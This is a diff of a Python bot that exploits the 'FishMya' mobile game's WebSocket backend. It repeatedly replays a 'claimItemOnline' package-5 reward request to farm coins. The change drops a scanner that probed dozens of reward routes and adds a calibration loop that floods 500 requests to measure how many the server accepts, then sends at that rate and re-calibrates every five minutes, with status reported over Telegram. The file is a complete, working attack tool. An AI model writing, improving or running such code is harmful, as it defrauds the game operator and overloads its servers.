@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-FishMya Game - Auto Scan + Exploit Bot (Thread-Safe Fixed)
+FishMya Game - Adaptive Rate Calibration Bot
 Author: GHOST
-Version: 18.4 - Single Thread WS + Slow Rate
+Version: 21.0 - Re-calibrates periodically
 """
 
 import asyncio
@@ -31,10 +31,18 @@ WS_HEADERS = [
     "X-Requested-With: com.mytel.myid"
 ]
 
-# Rate control — server ကို မဖိအားပေးအောင်
-REQUESTS_PER_CYCLE = 3       # တစ်ခါ ၃ ခုပဲ ပို့
-SLEEP_BETWEEN_CYCLES = 0.05  # 50ms စောင့်
-PING_INTERVAL = 5            # 5 စက္ကန့်တစ်ခါ ping
+# ==================== RATE CONTROL ====================
+CALIBRATION_REQUESTS = 500      # စမ်းသပ်မယ့် request
+MIN_ACCEPTED = 50               # အနည်းဆုံး လက်ခံရမယ့်အရေအတွက်
+INITIAL_RATE = 150              # Default rate
+RECALIBRATE_EVERY = 300         # 5 မိနစ်တစ်ခါ re-calibrate
+SLEEP_BETWEEN_CYCLES = 0.5      # Cycle ကြားစောင့်
+PING_INTERVAL = 5
+RECV_TIMEOUT = 0.05
+RECV_WINDOW = 0.3
+
+# ==================== TARGET ROUTE ====================
+TARGET_ROUTE = {"route": "claimItemOnline", "data": {"package": 5}, "desc": "Pkg 5", "coins": 1500}
 
 # ==================== LOGGING ====================
 logging.basicConfig(
@@ -48,74 +56,6 @@ logger = logging.getLogger(__name__)
 TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
 last_update_id = 0
 owner_chat_id = None
-
-# ==================== SCAN ROUTES ====================
-SCAN_ROUTES = [
-    {"route": "claimItemOnline", "data": {"package": 1}, "desc": "Pkg 1"},
-    {"route": "claimItemOnline", "data": {"package": 2}, "desc": "Pkg 2"},
-    {"route": "claimItemOnline", "data": {"package": 3}, "desc": "Pkg 3"},
-    {"route": "claimItemOnline", "data": {"package": 4}, "desc": "Pkg 4"},
-    {"route": "claimItemOnline", "data": {"package": 5}, "desc": "Pkg 5"},
-    {"route": "claimItemOnline", "data": {"package": 6}, "desc": "Pkg 6"},
-    {"route": "claimItemOnline", "data": {"package": 7}, "desc": "Pkg 7"},
-    {"route": "claimItemOnline", "data": {"package": 8}, "desc": "Pkg 8"},
-    {"route": "claimItemOnline", "data": {"package": 9}, "desc": "Pkg 9"},
-    {"route": "claimItemOnline", "data": {"package": 10}, "desc": "Pkg 10"},
-    {"route": "claimDaily", "data": {}, "desc": "Daily"},
-    {"route": "claimDailyReward", "data": {}, "desc": "Daily Reward"},
-    {"route": "dailyClaim", "data": {}, "desc": "Daily Claim"},
-    {"route": "claimLogin", "data": {}, "desc": "Login"},
-    {"route": "loginReward", "data": {}, "desc": "Login Reward"},
-    {"route": "dailyBonus", "data": {}, "desc": "Daily Bonus"},
-    {"route": "checkin", "data": {}, "desc": "Check-in"},
-    {"route": "dailyCheckin", "data": {}, "desc": "Daily Check-in"},
-    {"route": "claimGift", "data": {}, "desc": "Gift"},
-    {"route": "openGift", "data": {}, "desc": "Open Gift"},
-    {"route": "receiveGift", "data": {}, "desc": "Receive Gift"},
-    {"route": "giftBox", "data": {}, "desc": "Gift Box"},
-    {"route": "openBox", "data": {}, "desc": "Open Box"},
-    {"route": "claimBox", "data": {}, "desc": "Claim Box"},
-    {"route": "claimReward", "data": {}, "desc": "Claim Reward"},
-    {"route": "getReward", "data": {}, "desc": "Get Reward"},
-    {"route": "receiveReward", "data": {}, "desc": "Receive Reward"},
-    {"route": "claimBonus", "data": {}, "desc": "Claim Bonus"},
-    {"route": "getBonus", "data": {}, "desc": "Get Bonus"},
-    {"route": "bonusReward", "data": {}, "desc": "Bonus Reward"},
-    {"route": "claimItem", "data": {}, "desc": "Claim Item"},
-    {"route": "useItem", "data": {"type": 1}, "desc": "Use Item 1"},
-    {"route": "useItem", "data": {"type": 2}, "desc": "Use Item 2"},
-    {"route": "useItem", "data": {"type": 3}, "desc": "Use Item 3"},
-    {"route": "useItem", "data": {"type": 4}, "desc": "Use Item 4"},
-    {"route": "useItem", "data": {"type": 5}, "desc": "Use Item 5"},
-    {"route": "useItem", "data": {"type": 6}, "desc": "Use Item 6"},
-    {"route": "claimMission", "data": {}, "desc": "Mission"},
-    {"route": "missionReward", "data": {}, "desc": "Mission Reward"},
-    {"route": "completeMission", "data": {}, "desc": "Complete Mission"},
-    {"route": "taskReward", "data": {}, "desc": "Task Reward"},
-    {"route": "claimTask", "data": {}, "desc": "Claim Task"},
-    {"route": "questReward", "data": {}, "desc": "Quest Reward"},
-    {"route": "levelReward", "data": {}, "desc": "Level Reward"},
-    {"route": "levelUpReward", "data": {}, "desc": "Level Up"},
-    {"route": "claimLevel", "data": {}, "desc": "Claim Level"},
-    {"route": "eventReward", "data": {}, "desc": "Event Reward"},
-    {"route": "claimEvent", "data": {}, "desc": "Claim Event"},
-    {"route": "eventBonus", "data": {}, "desc": "Event Bonus"},
-    {"route": "onlineReward", "data": {}, "desc": "Online Reward"},
-    {"route": "onlineBonus", "data": {}, "desc": "Online Bonus"},
-    {"route": "timeReward", "data": {}, "desc": "Time Reward"},
-    {"route": "hourlyReward", "data": {}, "desc": "Hourly Reward"},
-    {"route": "catchFish", "data": {}, "desc": "Catch Fish"},
-    {"route": "fishReward", "data": {}, "desc": "Fish Reward"},
-    {"route": "claimFish", "data": {}, "desc": "Claim Fish"},
-    {"route": "exchange", "data": {}, "desc": "Exchange"},
-    {"route": "exchangeItem", "data": {}, "desc": "Exchange Item"},
-    {"route": "convert", "data": {}, "desc": "Convert"},
-    {"route": "getBalance", "data": {}, "desc": "Get Balance"},
-    {"route": "refreshCash", "data": {}, "desc": "Refresh Cash"},
-    {"route": "syncCash", "data": {}, "desc": "Sync Cash"},
-    {"route": "updateCash", "data": {}, "desc": "Update Cash"},
-    {"route": "reloadCash", "data": {}, "desc": "Reload Cash"},
-]
 
 # ==================== STATE ====================
 bot_state = {
@@ -136,14 +76,13 @@ bot_state = {
     'last_coin_time': None,
     'auto_restart_count': 0,
     'start_time': None,
-    'scan_results': {},
     'best_route': None,
     'best_route_coins': 0,
-    'total_coins_all': 0,
     'coins_per_second': 0,
-    'max_requests_per_second': 0,
     'current_requests_per_second': 0,
-    'rps_test_result': {},
+    'dynamic_rate': INITIAL_RATE,
+    'calibration_history': [],
+    'last_calibration': {},
 }
 
 state_lock = threading.Lock()
@@ -217,7 +156,7 @@ def get_main_keyboard():
         ]
     })
 
-# ==================== CONNECT & LOGIN (FIXED) ====================
+# ==================== CONNECT & LOGIN ====================
 def connect_and_login():
     try:
         ws = websocket.create_connection(
@@ -264,71 +203,11 @@ def connect_and_login():
         logger.error(f"Connection error: {e}")
         return None, None
 
-# ==================== TEST BEST ROUTE ====================
-def test_best_route_performance(ws, best_route):
-    if not ws or not ws.connected or not best_route:
-        return None
-    logger.info(f"🧪 Testing best route: {best_route['desc']} with 50 requests...")
-    route_name = best_route['route']
-    route_data = best_route['data']
-    desc = best_route['desc']
-    total_coins = 0
-    successful_requests = 0
-    start_time = time.time()
-    msg_id = 10000
-    for i in range(50):
-        try:
-            ws.send(msgpack.packb({
-                "route": route_name,
-                "data": route_data,
-                "msgId": msg_id
-            }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
-            msg_id += 1
-        except:
-            break
-        time.sleep(0.02)
-    ws.settimeout(0.5)
-    response_end_time = time.time() + 3
-    while time.time() < response_end_time:
-        try:
-            m = ws.recv()
-            d = msgpack.unpackb(m, raw=False)
-            coins = extract_coins(d)
-            if coins > 0:
-                total_coins += coins
-                successful_requests += 1
-        except websocket.WebSocketTimeoutException:
-            continue
-        except:
-            break
-    elapsed_time = time.time() - start_time
-    if elapsed_time == 0:
-        elapsed_time = 0.1
-    coins_per_second = int(total_coins / elapsed_time) if total_coins > 0 else 0
-    requests_per_second = int(successful_requests / elapsed_time) if successful_requests > 0 else 0
-    result = {
-        'route': desc,
-        'total_requests': 50,
-        'successful': successful_requests,
-        'total_coins': total_coins,
-        'elapsed_time': round(elapsed_time, 2),
-        'coins_per_second': coins_per_second,
-        'requests_per_second': requests_per_second,
-        'avg_coins_per_request': int(total_coins / successful_requests) if successful_requests > 0 else 0
-    }
-    bot_state['rps_test_result'] = result
-    logger.info(f"📊 Test Result: {desc} → {total_coins} coins, {coins_per_second} coins/s, {requests_per_second} rps")
-    return result
-
-# ==================== SCAN (UNCHANGED) ====================
-def scan_routes():
+# ==================== VERIFY PKG 5 ====================
+def verify_pkg5():
     global bot_state
     bot_state['scanning'] = True
     bot_state['found_routes'] = []
-    bot_state['scan_results'] = {}
-    bot_state['best_route'] = None
-    bot_state['best_route_coins'] = 0
-    bot_state['total_coins_all'] = 0
 
     ws, login_data = connect_and_login()
     if not ws or not login_data:
@@ -346,24 +225,44 @@ def scan_routes():
     }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
     time.sleep(1)
 
+    logger.info("🔍 Verifying Pkg 5...")
     msg_id = 1000
-    found = []
-    scan_stats = {}
+    coins_found = 0
 
-    logger.info("🔍 Scanning individual routes...")
-    for route_info in SCAN_ROUTES:
-        route_name = route_info['route']
-        route_data = route_info['data']
-        desc = route_info['desc']
+    ws.send(msgpack.packb({
+        "route": TARGET_ROUTE['route'],
+        "data": TARGET_ROUTE['data'],
+        "msgId": msg_id
+    }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
 
+    ws.settimeout(1.0)
+    try:
+        while True:
+            m = ws.recv()
+            d = msgpack.unpackb(m, raw=False)
+            if d.get("route") == "reloadCash":
+                change = d.get("data", {}).get("changeCash", 0)
+                if change > 0:
+                    coins_found = change
+                    break
+            if d.get("msgId") == msg_id:
+                coins_found = extract_coins(d)
+                if coins_found > 0:
+                    break
+    except websocket.WebSocketTimeoutException:
+        pass
+    except:
+        pass
+    msg_id += 1
+
+    repeat_coins = 0
+    if coins_found > 0:
         ws.send(msgpack.packb({
-            "route": route_name,
-            "data": route_data,
+            "route": TARGET_ROUTE['route'],
+            "data": TARGET_ROUTE['data'],
             "msgId": msg_id
         }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
-
-        ws.settimeout(0.5)
-        coins_found = 0
+        ws.settimeout(1.0)
         try:
             while True:
                 m = ws.recv()
@@ -371,101 +270,125 @@ def scan_routes():
                 if d.get("route") == "reloadCash":
                     change = d.get("data", {}).get("changeCash", 0)
                     if change > 0:
-                        coins_found = change
+                        repeat_coins = change
                         break
                 if d.get("msgId") == msg_id:
-                    coins_found = extract_coins(d)
-                    if coins_found > 0:
+                    repeat_coins = extract_coins(d)
+                    if repeat_coins > 0:
                         break
         except websocket.WebSocketTimeoutException:
             pass
         except:
             pass
-        msg_id += 1
-
-        repeatable = False
-        if coins_found > 0:
-            ws.send(msgpack.packb({
-                "route": route_name,
-                "data": route_data,
-                "msgId": msg_id
-            }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
-            ws.settimeout(0.5)
-            repeat_coins = 0
-            try:
-                while True:
-                    m = ws.recv()
-                    d = msgpack.unpackb(m, raw=False)
-                    if d.get("route") == "reloadCash":
-                        change = d.get("data", {}).get("changeCash", 0)
-                        if change > 0:
-                            repeat_coins = change
-                            break
-                    if d.get("msgId") == msg_id:
-                        repeat_coins = extract_coins(d)
-                        if repeat_coins > 0:
-                            break
-            except websocket.WebSocketTimeoutException:
-                pass
-            except:
-                pass
-            msg_id += 1
-            repeatable = repeat_coins > 0
-
-        scan_stats[desc] = {
-            'coins': coins_found,
-            'repeatable': repeatable,
-            'route': route_name,
-            'data': route_data
-        }
-
-        if coins_found > 0:
-            logger.info(f"📊 {desc}: {coins_found} coins (Repeat: {repeatable})")
-            if repeatable:
-                found.append({'route': route_name, 'data': route_data, 'desc': desc,
-                              'coins': coins_found, 'repeatable': True})
-
-        time.sleep(0.05)
-
-    best_route = max(found, key=lambda x: x['coins']) if found else None
-    test_result = None
-    if best_route:
-        bot_state['best_route'] = best_route
-        bot_state['best_route_coins'] = best_route['coins']
-        logger.info(f"🏆 Best route: {best_route['desc']} - {best_route['coins']} coins")
-        test_result = test_best_route_performance(ws, best_route)
-        if test_result:
-            bot_state['max_requests_per_second'] = test_result['requests_per_second']
-            bot_state['coins_per_second'] = test_result['coins_per_second']
-
-    total_all = sum(r['coins'] for r in found)
-    bot_state['total_coins_all'] = total_all
-    logger.info(f"📊 Total coins all routes: {total_all}")
 
     try:
         ws.close()
     except:
         pass
-    bot_state['found_routes'] = [r for r in found if r['repeatable']]
-    bot_state['scan_results'] = scan_stats
+
     bot_state['scanning'] = False
 
-    if owner_chat_id:
-        summary = f"🔍 *Scan Complete!*\n\n"
-        summary += f"🏆 Best Route: {best_route['desc'] if best_route else 'None'} - {bot_state['best_route_coins']} coins\n"
-        summary += f"📊 Total All Routes: {total_all} coins\n"
-        summary += f"📦 Found Routes: {len(bot_state['found_routes'])}\n\n"
-        if test_result:
-            summary += f"🧪 *Test with 50 Requests:*\n"
-            summary += f"  • Coins/s: {test_result['coins_per_second']:,}\n"
-            summary += f"  • Requests/s: {test_result['requests_per_second']}\n"
-            summary += f"  • Time: {test_result['elapsed_time']}s\n"
-            summary += f"  • Total Coins: {test_result['total_coins']:,}\n"
-        asyncio.run(send_telegram(owner_chat_id, summary))
+    if coins_found > 0 and repeat_coins > 0:
+        bot_state['best_route'] = TARGET_ROUTE
+        bot_state['best_route_coins'] = coins_found
+        bot_state['found_routes'] = [TARGET_ROUTE]
+        logger.info(f"✅ Pkg 5 verified: {coins_found} coins/claim, repeatable")
+        return True
+    else:
+        logger.warning(f"❌ Pkg 5 failed")
+        return False
 
-    return len(bot_state['found_routes']) > 0
+# ==================== CALIBRATION ====================
+def calibrate_rate(ws):
+    """
+    Send 500 requests, count accepted, return (accepted, new_rate)
+    - accepted < 50 → retry with 500
+    - accepted >= 50 → use accepted as new rate
+    """
+    logger.info(f"🧪 CALIBRATION: Sending {CALIBRATION_REQUESTS} requests...")
 
-# ==================== EXPLOIT (SINGLE-THREAD + SLOW RATE) ====================
+    accepted = 0
+    rejected = 0
+    timeouts = 0
+    coins_from_test = 0
+    msg_id = 20000
+
+    for i in range(CALIBRATION_REQUESTS):
+        try:
+            ws.send(msgpack.packb({
+                "route": TARGET_ROUTE['route'],
+                "data": TARGET_ROUTE['data'],
+                "msgId": msg_id
+            }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
+            msg_id += 1
+        except Exception as e:
+            logger.error(f"Send error: {e}")
+            break
+        time.sleep(0.002)
+
+    logger.info(f"✅ Sent {CALIBRATION_REQUESTS}. Waiting 5s...")
+
+    ws.settimeout(0.2)
+    response_end = time.time() + 5
+    while time.time() < response_end:
+        try:
+            m = ws.recv()
+            if not m:
+                continue
+            d = msgpack.unpackb(m, raw=False)
+            route = d.get("route", "")
+            inner = d.get("data", {})
+            if route == "reloadCash":
+                change = inner.get("changeCash", 0)
+                if change > 0:
+                    accepted += 1
+                    coins_from_test += change
+            elif inner.get("ok") is False:
+                rejected += 1
+        except websocket.WebSocketTimeoutException:
+            timeouts += 1
+            continue
+        except ssl.SSLError as e:
+            logger.error(f"SSL error: {e}")
+            break
+        except Exception as e:
+            logger.error(f"Recv error: {e}")
+            break
+
+    logger.info(
+        f"📊 CALIBRATION RESULT:\n"
+        f"   ✅ Accepted: {accepted}\n"
+        f"   ❌ Rejected: {rejected}\n"
+        f"   ⏰ Timeouts: {timeouts}\n"
+        f"   💰 Coins: {coins_from_test:,}"
+    )
+
+    # Save history
+    result = {
+        'sent': CALIBRATION_REQUESTS,
+        'accepted': accepted,
+        'rejected': rejected,
+        'timeouts': timeouts,
+        'coins': coins_from_test,
+        'time': datetime.now().strftime('%H:%M:%S'),
+    }
+    bot_state['last_calibration'] = result
+    bot_state['calibration_history'].append(result)
+    if len(bot_state['calibration_history']) > 20:
+        bot_state['calibration_history'].pop(0)
+
+    # ---- Decide new rate ----
+    if accepted < MIN_ACCEPTED:
+        # လက်ခံမှု နည်း → 500 နဲ့ ပြန်စမ်း
+        logger.warning(f"⚠️ Accepted {accepted} < {MIN_ACCEPTED} → retry with 500")
+        return accepted, CALIBRATION_REQUESTS
+    else:
+        # လက်ခံမှု ကောင်း → accepted ကို rate အဖြစ်သုံး
+        logger.info(f"✅ Accepted {accepted} >= {MIN_ACCEPTED} → new rate = {accepted}")
+        return accepted, accepted
+
+
+# ==================== EXPLOIT ====================
 def exploit_loop():
     global bot_state
     if not bot_state['found_routes']:
@@ -478,22 +401,7 @@ def exploit_loop():
     bot_state['errors'] = 0
     bot_state['auto_restart_count'] = 0
     bot_state['start_time'] = datetime.now()
-    bot_state['route_stats'] = {}
-
-    for r in bot_state['found_routes']:
-        bot_state['route_stats'][r['desc']] = {'sent': 0, 'received': 0, 'coins': 0}
-
-    best_route = bot_state['best_route']
-
-    if owner_chat_id:
-        exploit_msg = (
-            f"⚡ *Exploit Started!*\n\n"
-            f"🏆 Best Route: {best_route['desc'] if best_route else 'None'} ({bot_state['best_route_coins']} coins)\n"
-            f"📦 Using: {len(bot_state['found_routes'])} routes\n"
-            f"⏱️ Rate: {REQUESTS_PER_CYCLE} req / {int(SLEEP_BETWEEN_CYCLES*1000)}ms\n\n"
-            f"💡 Use *Status* button to check progress."
-        )
-        asyncio.run(send_telegram(owner_chat_id, exploit_msg, get_main_keyboard()))
+    bot_state['route_stats'] = {'Pkg 5': {'sent': 0, 'received': 0, 'coins': 0}}
 
     retry_delay = 5
     while bot_state['is_running']:
@@ -502,7 +410,7 @@ def exploit_loop():
             bot_state['errors'] += 1
             bot_state['last_error'] = "Login failed"
             bot_state['connected'] = False
-            logger.error(f"Login failed, retrying in {retry_delay}s...")
+            logger.error(f"Login failed, retry in {retry_delay}s...")
             time.sleep(retry_delay)
             retry_delay = min(retry_delay + 5, 30)
             continue
@@ -513,7 +421,6 @@ def exploit_loop():
         bot_state['connected'] = True
         bot_state['current_balance'] = login_data.get("cash", bot_state['current_balance'])
 
-        # enter room
         try:
             ws.send(msgpack.packb({
                 "route": "play",
@@ -524,6 +431,72 @@ def exploit_loop():
             pass
         time.sleep(1)
 
+        # ===== INITIAL CALIBRATION LOOP =====
+        dynamic_rate = INITIAL_RATE
+        calibration_ok = False
+
+        if owner_chat_id:
+            asyncio.run(send_telegram(
+                owner_chat_id,
+                f"🧪 *Calibration Starting*\n\n"
+                f"📤 Sending {CALIBRATION_REQUESTS} test requests..."
+            ))
+
+        while bot_state['is_running'] and not calibration_ok:
+            accepted, dynamic_rate = calibrate_rate(ws)
+
+            if accepted >= MIN_ACCEPTED:
+                calibration_ok = True
+                bot_state['dynamic_rate'] = dynamic_rate
+                logger.info(f"🎯 Using rate: {dynamic_rate} req/cycle")
+
+                if owner_chat_id:
+                    asyncio.run(send_telegram(
+                        owner_chat_id,
+                        f"🎯 *Calibration Complete!*\n\n"
+                        f"✅ Accepted: {accepted}/{CALIBRATION_REQUESTS}\n"
+                        f"📊 New Rate: *{dynamic_rate} req/cycle*\n"
+                        f"💰 Test coins: {bot_state['last_calibration'].get('coins', 0):,}\n\n"
+                        f"⚡ Starting exploit..."
+                    ))
+            else:
+                logger.warning(f"❌ Calibration failed ({accepted}/500). Retry...")
+                if owner_chat_id:
+                    asyncio.run(send_telegram(
+                        owner_chat_id,
+                        f"⚠️ *Calibration Failed*\n\n"
+                        f"Accepted only {accepted}/{CALIBRATION_REQUESTS}\n"
+                        f"🔄 Retrying with 500 again in 5s..."
+                    ))
+                time.sleep(5)
+
+                try:
+                    ws.close()
+                except:
+                    pass
+                ws, login_data = connect_and_login()
+                if not ws or not login_data:
+                    logger.error("Reconnect failed")
+                    break
+
+                try:
+                    ws.send(msgpack.packb({
+                        "route": "play",
+                        "data": {"roomId": 1},
+                        "msgId": 2
+                    }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
+                except:
+                    pass
+                time.sleep(1)
+
+        if not bot_state['is_running'] or not calibration_ok:
+            try:
+                ws.close()
+            except:
+                pass
+            continue
+
+        # ===== EXPLOIT LOOP with dynamic_rate + re-calibration =====
         msg_id = 5000
         last_coin_time = time.time()
         coins_in_interval = 0
@@ -531,10 +504,52 @@ def exploit_loop():
         request_count = 0
         connection_broken = False
         last_ping_time = time.time()
+        last_calibration_time = time.time()
+
+        if owner_chat_id:
+            asyncio.run(send_telegram(
+                owner_chat_id,
+                f"⚡ *Exploit Started!*\n\n"
+                f"🎯 Target: Pkg 5 (1500 coins/claim)\n"
+                f"📊 Rate: {dynamic_rate} req/cycle\n"
+                f"🔄 Re-calibrate every {RECALIBRATE_EVERY}s\n\n"
+                f"💡 Use *Status* button."
+            ))
 
         try:
             while bot_state['is_running'] and not connection_broken:
-                # ---- Ping in main loop (no separate thread) ----
+                # ---- Periodic re-calibration ----
+                if time.time() - last_calibration_time >= RECALIBRATE_EVERY:
+                    logger.info(f"🔄 Re-calibrating (every {RECALIBRATE_EVERY}s)...")
+
+                    # Pause exploit briefly
+                    accepted, new_rate = calibrate_rate(ws)
+
+                    if accepted >= MIN_ACCEPTED:
+                        dynamic_rate = new_rate
+                        bot_state['dynamic_rate'] = new_rate
+                        logger.info(f"🎯 New rate: {new_rate}")
+
+                        if owner_chat_id:
+                            asyncio.run(send_telegram(
+                                owner_chat_id,
+                                f"🔄 *Re-Calibrated*\n\n"
+                                f"✅ Accepted: {accepted}/{CALIBRATION_REQUESTS}\n"
+                                f"📊 New Rate: *{new_rate}*"
+                            ))
+                    else:
+                        logger.warning(f"⚠️ Re-calib failed ({accepted}/500). Keep old rate.")
+                        if owner_chat_id:
+                            asyncio.run(send_telegram(
+                                owner_chat_id,
+                                f"⚠️ *Re-Calib Failed*\n\n"
+                                f"Accepted only {accepted}/{CALIBRATION_REQUESTS}\n"
+                                f"Keeping rate: {dynamic_rate}"
+                            ))
+
+                    last_calibration_time = time.time()
+
+                # ---- Ping ----
                 if time.time() - last_ping_time >= PING_INTERVAL:
                     try:
                         ws.send(msgpack.packb({
@@ -546,33 +561,35 @@ def exploit_loop():
                     except:
                         pass
 
-                # ---- Send small batch ----
-                for _ in range(REQUESTS_PER_CYCLE):
+                # ---- Send dynamic_rate requests ----
+                send_ok = True
+                for _ in range(dynamic_rate):
                     if not bot_state['is_running']:
                         break
-                    if best_route:
-                        try:
-                            ws.send(msgpack.packb({
-                                "route": best_route['route'],
-                                "data": best_route['data'],
-                                "msgId": msg_id
-                            }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
-                        except Exception as e:
-                            logger.error(f"Send error: {e}")
-                            connection_broken = True
-                            break
-                        request_count += 1
-                        msg_id += 1
-                        with state_lock:
-                            bot_state['route_stats'][best_route['desc']]['sent'] += 1
-                            bot_state['claims_done'] += 1
+                    try:
+                        ws.send(msgpack.packb({
+                            "route": TARGET_ROUTE['route'],
+                            "data": TARGET_ROUTE['data'],
+                            "msgId": msg_id
+                        }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
+                    except Exception as e:
+                        logger.error(f"Send error: {e}")
+                        connection_broken = True
+                        send_ok = False
+                        break
+                    request_count += 1
+                    msg_id += 1
 
-                if connection_broken:
+                if not send_ok or connection_broken:
                     break
 
+                with state_lock:
+                    bot_state['route_stats']['Pkg 5']['sent'] += dynamic_rate
+                    bot_state['claims_done'] += dynamic_rate
+
                 # ---- Receive window ----
-                ws.settimeout(0.15)
-                recv_end = time.time() + 0.15
+                ws.settimeout(RECV_TIMEOUT)
+                recv_end = time.time() + RECV_WINDOW
                 while time.time() < recv_end:
                     try:
                         m = ws.recv()
@@ -589,12 +606,8 @@ def exploit_loop():
                                     bot_state['current_balance'] = inner.get("newCash", bot_state['current_balance'])
                                     coins_in_interval += change
                                     last_coin_time = time.time()
-                                for ri in bot_state['found_routes']:
-                                    if abs(change - ri['coins']) <= 50:
-                                        with state_lock:
-                                            bot_state['route_stats'][ri['desc']]['received'] += 1
-                                            bot_state['route_stats'][ri['desc']]['coins'] += change
-                                        break
+                                    bot_state['route_stats']['Pkg 5']['received'] += 1
+                                    bot_state['route_stats']['Pkg 5']['coins'] += change
                     except websocket.WebSocketTimeoutException:
                         break
                     except ssl.SSLError as e:
@@ -650,15 +663,15 @@ def exploit_loop():
 def auto_main_loop():
     while True:
         try:
-            logger.info("🔄 Starting scan...")
-            success = scan_routes()
+            logger.info("🔄 Verifying Pkg 5...")
+            success = verify_pkg5()
             if success:
-                logger.info("✅ Scan found routes. Cooling down 5s before exploit...")
+                logger.info("✅ Pkg 5 confirmed. Cooling down 5s...")
                 time.sleep(5)
-                logger.info("⚡ Starting exploit...")
+                logger.info("⚡ Starting exploit with calibration...")
                 exploit_loop()
             else:
-                logger.warning("❌ Scan found no routes, restarting in 10s...")
+                logger.warning("❌ Pkg 5 not working, retry in 10s...")
                 time.sleep(10)
         except Exception as e:
             logger.error(f"Auto loop error: {e}")
@@ -671,11 +684,12 @@ async def process_command(chat_id: str, text: str):
     if text.startswith('/start'):
         if owner_chat_id is None:
             owner_chat_id = chat_id
-        best = bot_state.get('best_route')
-        best_desc = best.get('desc') if isinstance(best, dict) else 'None'
+        lc = bot_state.get('last_calibration', {}) or {}
         status_text = (
-            "🤖 *Auto FishMya Bot*\n\n"
-            f"🏆 Best Route: {best_desc}\n"
+            "🤖 *FishMya Pkg 5 Adaptive Bot*\n\n"
+            f"🎯 Target: Pkg 5 ({TARGET_ROUTE['coins']:,}/claim)\n"
+            f"📊 Dynamic Rate: *{bot_state.get('dynamic_rate', 0)}* req\n"
+            f"🧪 Last Calib: {lc.get('accepted', 0)}/{lc.get('sent', 0)}\n"
             f"💰 Balance: {bot_state.get('current_balance', 0):,}\n"
             f"📈 Gained: +{bot_state.get('total_claimed', 0):,}\n"
             f"📊 CPS: {int(bot_state.get('coins_per_second', 0)):,}\n"
@@ -689,10 +703,13 @@ async def process_command(chat_id: str, text: str):
     elif text in ['/status']:
         status = "🟢 Running" if bot_state['is_running'] else "🔴 Stopped"
         elapsed = (datetime.now() - bot_state['start_time']).seconds if bot_state['start_time'] else 0
+        lc = bot_state.get('last_calibration', {}) or {}
         text_msg = (
             f"📊 *Status*\n\n"
             f"State: {status}\n"
-            f"Routes: {len(bot_state['found_routes'])}\n"
+            f"🎯 Target: Pkg 5\n"
+            f"📊 Rate: *{bot_state.get('dynamic_rate', 0)}* req\n"
+            f"🧪 Calib: {lc.get('accepted', 0)}/{lc.get('sent', 0)}\n"
             f"Claims: {bot_state['claims_done']:,}\n"
             f"💰 Balance: {bot_state['current_balance']:,}\n"
             f"📈 Gained: +{bot_state['total_claimed']:,}\n"
@@ -705,23 +722,27 @@ async def process_command(chat_id: str, text: str):
     elif text in ['/balance']:
         await send_telegram(chat_id, f"💰 Balance: {bot_state['current_balance']:,}\n📈 Gained: +{bot_state['total_claimed']:,}")
     elif text in ['/stats']:
-        best = bot_state.get('best_route')
-        best_desc = best.get('desc') if isinstance(best, dict) else 'None'
+        lc = bot_state.get('last_calibration', {}) or {}
+        hist = bot_state.get('calibration_history', [])
         stats_text = "📊 *Detailed Stats*\n\n"
-        stats_text += f"🏆 Best Route: {best_desc} - {bot_state.get('best_route_coins', 0)} coins\n"
-        stats_text += f"📊 Total All Routes: {bot_state.get('total_coins_all', 0)} coins\n"
-        stats_text += f"🚀 Max RPS: {bot_state.get('max_requests_per_second', 0)}\n"
+        stats_text += f"🎯 Target: Pkg 5 ({TARGET_ROUTE['coins']:,}/claim)\n"
+        stats_text += f"📊 Dynamic Rate: *{bot_state.get('dynamic_rate', 0)}* req\n"
         stats_text += f"📈 Current CPS: {int(bot_state.get('coins_per_second', 0)):,}\n"
-        test_result = bot_state.get('rps_test_result', {}) or {}
-        if test_result:
-            stats_text += "\n🧪 *Test Result:*\n"
-            stats_text += f"  • Coins/s: {test_result.get('coins_per_second', 0):,}\n"
-            stats_text += f"  • Requests/s: {test_result.get('requests_per_second', 0)}\n"
-            stats_text += f"  • Time: {test_result.get('elapsed_time', 0)}s\n"
-            stats_text += f"  • Total Coins: {test_result.get('total_coins', 0):,}\n"
+        stats_text += f"🚀 RPS: {int(bot_state.get('current_requests_per_second', 0))}\n"
+        if lc:
+            stats_text += "\n🧪 *Last Calibration:*\n"
+            stats_text += f"  • Sent: {lc.get('sent', 0)}\n"
+            stats_text += f"  • ✅ Accepted: {lc.get('accepted', 0)}\n"
+            stats_text += f"  • ❌ Rejected: {lc.get('rejected', 0)}\n"
+            stats_text += f"  • ⏰ Timeouts: {lc.get('timeouts', 0)}\n"
+            stats_text += f"  • 💰 Coins: {lc.get('coins', 0):,}\n"
+        if hist:
+            stats_text += "\n📜 *Recent Calibrations:*\n"
+            for h in hist[-5:]:
+                stats_text += f"  • {h.get('time', '')}: {h.get('accepted', 0)}/{h.get('sent', 0)}\n"
         stats_text += "\n📊 Route Stats:\n"
         for desc, s in (bot_state.get('route_stats', {}) or {}).items():
-            stats_text += f"  • {desc}: {s.get('coins', 0)} coins\n"
+            stats_text += f"  • {desc}: {s.get('coins', 0):,} coins ({s.get('sent', 0)} sent / {s.get('received', 0)} recv)\n"
         await send_telegram(chat_id, stats_text, get_main_keyboard())
 
 async def handle_callback(chat_id: str, data: str):
@@ -738,7 +759,7 @@ async def handle_callback(chat_id: str, data: str):
 # ==================== MAIN ====================
 async def main():
     global last_update_id, owner_chat_id
-    print("Starting auto FishMya bot...")
+    print("Starting FishMya Pkg 5 Adaptive Bot...")
     threading.Thread(target=auto_main_loop, daemon=True).start()
     while True:
         try:
